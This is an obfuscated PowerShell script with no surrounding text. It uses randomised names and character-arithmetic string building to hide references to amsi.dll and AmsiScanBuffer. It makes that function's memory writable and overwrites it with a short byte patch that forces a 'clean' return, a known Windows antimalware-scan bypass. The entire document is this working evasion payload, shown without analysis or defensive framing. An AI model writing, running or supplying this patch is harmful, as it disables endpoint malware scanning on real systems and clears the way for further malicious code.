$SZkhM4Nt41eUMaTW0g = @"
using System;
using System.Runtime.InteropServices;
public class SZkhM4Nt41eUMaTW0g {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ujK, string EVxNYCD3rHza8XtI);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Jejr1OL, UIntPtr D6n7GTFuHbhHen, uint nZ3LrWSHyLShIf, out uint cBWpHiW1r);
}
"@

Add-Type $SZkhM4Nt41eUMaTW0g

$fKo6D3UNimiEX = [SZkhM4Nt41eUMaTW0g]::LoadLibrary("$(('ãms'+'ì.d'+'ll').NormALizE([Char](70)+[CHar](111+58-58)+[CHaR]([BYTE]0x72)+[cHaR]([ByTe]0x6d)+[chAr](68*30/30)) -replace [cHaR]([Byte]0x5c)+[CHaR]([BYTE]0x70)+[ChAR]([ByTe]0x7b)+[ChAr](77*67/67)+[chAr](88+22)+[cHAr](125))")
$e_Cu = [SZkhM4Nt41eUMaTW0g]::GetProcAddress($fKo6D3UNimiEX, "$([Char](65*39/39)+[Char](109+96-96)+[chaR]([byte]0x73)+[char](56+49)+[chAr](83)+[CHAR]([bYTE]0x63)+[chaR](85+12)+[cHAr](110*8/8)+[chAr](66*28/28)+[ChAR]([byTe]0x75)+[CHAR]([byTe]0x66)+[ChAr]([bYte]0x66)+[cHaR](101)+[CHaR](114))")
$p = 0
[SZkhM4Nt41eUMaTW0g]::VirtualProtect($e_Cu, [uint32]5, 0x40, [ref]$p)
$X6AYLSVwD = "0xB8"
$aFT = "0x57"
$h8lhHrwypwO_FKht7 = "0x00"
$dOFK7gW9o7EWxm8VNk = "0x07"
$mq8nl6E1oWikhF3 = "0x80"
$PZj6S4 = "0xC3"
$xY7 = [Byte[]] ($X6AYLSVwD,$aFT,$h8lhHrwypwO_FKht7,$dOFK7gW9o7EWxm8VNk,+$mq8nl6E1oWikhF3,+$PZj6S4)
[System.Runtime.InteropServices.Marshal]::Copy($xY7, 0, $e_Cu, 6)